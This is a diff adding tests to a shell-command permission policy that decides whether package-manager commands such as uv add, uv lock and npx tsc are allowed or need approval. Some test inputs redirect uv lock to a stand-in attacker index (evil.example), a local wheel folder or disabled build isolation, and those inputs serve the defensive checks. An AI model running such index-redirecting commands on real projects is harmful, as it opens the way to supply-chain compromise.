@@ -3452,3 +3452,73 @@ def test_moving_one_note_does_not_cover_deleting_another() -> None:
     )
 
     assert decision.effect == "deny"
+
+
+def test_installing_asks_and_the_verbs_that_fetch_nothing_do_not() -> None:
+    """Where the line sits, and that clearing a cache was never on it.
+
+    Fetching a package runs its build code, which is the escape a
+    supply-chain compromise arrives through — so both verbs that install ask,
+    and the packages having been declared earlier does not answer it, because
+    what changed is what the index now serves. Writing a lockfile and
+    dropping a dependency fetch nothing to execute, and a cache is rebuilt by
+    the command that reads it. That verb reached no rule at all, which is why
+    a refresh line asked with it among the reasons.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("uv add httpx") == "ask"
+    assert effect("uv sync --all-extras") == "ask"
+    assert effect("uv lock --upgrade-package lup") == "allow"
+    assert effect("uv cache clean lup") == "allow"
+    assert effect("uv remove ruff") == "allow"
+
+
+def test_a_verb_pointed_at_another_index_is_not_the_verb_it_rides_on() -> None:
+    """Naming a package source is a different act wearing the same word.
+
+    `uv lock` writes what this project declares — while nothing on the
+    command line redirects where packages come from, or removes the isolation
+    their build code runs in. Either makes the allow wrong, and an unreadable
+    word answers the same way, because absence is what is being tested.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("uv lock") == "allow"
+    assert effect("uv lock --index-url http://evil.example/simple") == "ask"
+    assert effect("uv lock --extra-index-url http://evil.example/simple") == "ask"
+    assert effect("uv lock -f /tmp/wheels") == "ask"
+    assert effect("uv lock --no-build-isolation") == "ask"
+    assert effect("uv remove ruff --index https://mirror.example") == "ask"
+    assert effect("uv lock $FLAGS") == "ask"
+
+
+def test_a_type_check_through_a_package_runner_is_the_read_it_is() -> None:
+    """Both runners name the compiler beneath them, so a verify line passes.
+
+    A verify line ending in `npx tsc --noEmit` asked about its last segment
+    and, since segments join, made the whole line ask — a question about
+    running the type checker.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    for runner in ("npx", "bunx"):
+        assert effect(f"{runner} tsc --noEmit") == "allow", runner
+        assert effect(f"{runner} tsc --version") == "allow", runner
+        # The runner itself still asks: what it fetches is not bounded by the
+        # command, and only the compiler is named beneath it.
+        assert effect(f"{runner} create-react-app app") == "ask", runner
+        assert effect(f"{runner} tsc --outDir build") == "ask", runner
+
+    # Composed the way it was met: segments join, so one asking segment made
+    # a whole verify line ask.
+    assert effect("git status --short && cd frontend && npx tsc --noEmit") == "allow"
